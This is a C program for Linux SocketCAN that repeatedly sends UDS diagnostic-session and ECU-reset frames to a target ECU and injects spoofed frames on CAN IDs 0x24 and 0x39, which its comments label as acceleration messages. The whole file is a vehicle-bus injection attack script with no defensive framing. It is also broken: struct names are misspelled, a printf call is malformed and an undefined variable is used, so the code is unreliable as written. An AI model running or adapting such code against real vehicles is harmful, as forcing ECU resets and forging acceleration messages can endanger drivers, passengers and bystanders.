#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <linux/can.h>
#include <linux/can/raw.h>

void send_can_frame(int s, struct can_frame frame, struct socckaddr_can addr) {
    if (write(s, &frame, sizeof(struct can_frame)) != sizeof(struct can_frame)){
        perror ("Write");
        exit(1);
    }
}

int main(int argc, char*argv[]) {
    if (argc != 5 || strcmp(argv[3], "-diff") != 0) {
        printf("Usage: %s [can_interface] [ECUcanid] -diff [time_interval]\n"), argv[0]);
        exit(1);
    }

    char *interface = argv[1];
    int ECUcan_id = (int)strtol(argv[2], NULL, 16);
    int interval = atoi (argv[4]);

    int s;
    struct socketaddr_can addr;
    struct ifreq ifr;
    struct can_frame frame;

    if ((s = socket(PF_CAN, SOCK_RAW, CAN_RAW)) < 0){
        perror("Socket fail");
        return 1;
    }

    strcpy(ifr.ifr_name, interface);
    ioctl(s, SIOCGIFINDEX, &ifr);

    addr.can_family = AF_CAN;
    addr.can_ifindex = ifr.ifr_ifindex;

    if (bind(s, (struct sockaddr *)&addr, sizeof(addr)) < 0){
        perror("Bind fail");
        return 1;
    }

    unsigned char resetpayload1[3] = {0x02, 0x10, 0x02};
    unsigned char resetpayload2[3] = {0x02, 0x11, 0x01};
    unsigned char accelpayload1[8] = {0x00, 0x00, 0xDF, 0x9D, 0x35, 0xEE, 0x12, 0x12};
    unsigned char accelpayload2[8] = {0x0F, 0xC5, 0xD3, 0x99, 0xDD, 0x21, 0x12, 0x12};


    do{
        //send ECURESET
        //resetpayload1
        frame.can_id = can_id;
        frame.can_dlc = 3;
        memcpy(frame.data, resetpayload1, 3);
        send_can_frame(s, frame, addr);
        //resetpayload2
        frame.can_id = can_id;
        frame.can_dlc = 3;
        memcpy(frame.data, resetpayload2, 3);
        send_can_frame(s, frame, addr);

        //sned ACCEL
        //accelpayload1
        frame.can_id = 0x24;
        frame.can_dlc = 8;
        memcpy(frame.data, accelpayload1, 8);
        send_can_frame(s, frame, addr);
        //acclepayload2
        frame.can_id = 0x39;
        frame.can_dlc = 8;
        memcpy(frame.data, accelpayload2, 8);
        send_can_frame(s, frame, addr);

        if (interval == 0) break;

        usleep(interval * 10000);
    } while (1);

    close(s);
    return 0;
}